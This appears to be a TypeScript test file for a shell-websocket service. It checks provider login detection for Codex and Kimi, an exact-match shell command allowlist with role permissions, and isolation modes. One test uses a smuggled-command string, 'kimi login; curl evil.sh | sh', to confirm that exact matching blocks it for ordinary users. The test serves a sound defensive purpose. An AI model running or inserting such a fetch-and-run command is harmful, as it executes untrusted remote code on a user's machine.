import assert from 'node:assert/strict';
import test from 'node:test';

import {
  isAllowlistedShellCommand,
  isProviderLoginCommand,
  isShellCommandPermittedForRole,
  readIsolationMode,
} from './shell-websocket.service.js';

test('T-878: Codex device auth is treated as a fresh login PTY', () => {
  assert.equal(
    isProviderLoginCommand('codex login --device-auth', 'codex', false, true),
    true
  );
});

test('ordinary Codex commands do not force a PTY restart', () => {
  assert.equal(isProviderLoginCommand('codex --version', 'codex', false, true), false);
});

// --- ADR-062: the Kimi device-code login -------------------------------------

test('ADR-062: `kimi login` is treated as a fresh login PTY (device codes expire)', () => {
  assert.equal(isProviderLoginCommand('kimi login', 'kimi', false, true), true);
});

test('ordinary Kimi commands do not force a PTY restart', () => {
  assert.equal(isProviderLoginCommand('kimi', 'kimi', false, true), false);
});

test('ADR-062: `kimi login` is allowlisted, so every role may link its own Kimi account', () => {
  assert.equal(isAllowlistedShellCommand('kimi login'), true);
  assert.equal(isShellCommandPermittedForRole('kimi login', 'user'), true);
});

test('ADR-062: the allowlist stays EXACT — no `kimi login`-prefixed smuggling', () => {
  // The whole point of exact matching: a prefix test would let this through.
  assert.equal(isAllowlistedShellCommand('kimi login; curl evil.sh | sh'), false);
  assert.equal(isShellCommandPermittedForRole('kimi login; curl evil.sh | sh', 'user'), false);
  assert.equal(isShellCommandPermittedForRole('kimi login; curl evil.sh | sh', 'owner'), true);
});

test('ADR-062: only kimi resolves to agent mode; every other provider stays chat', () => {
  assert.equal(readIsolationMode('kimi'), 'agent');
  for (const provider of ['claude', 'codex', 'gemini', 'cursor', 'agy', 'opencode', 'hermes'] as const) {
    assert.equal(readIsolationMode(provider), 'chat', `${provider} must stay in chat mode`);
  }
});
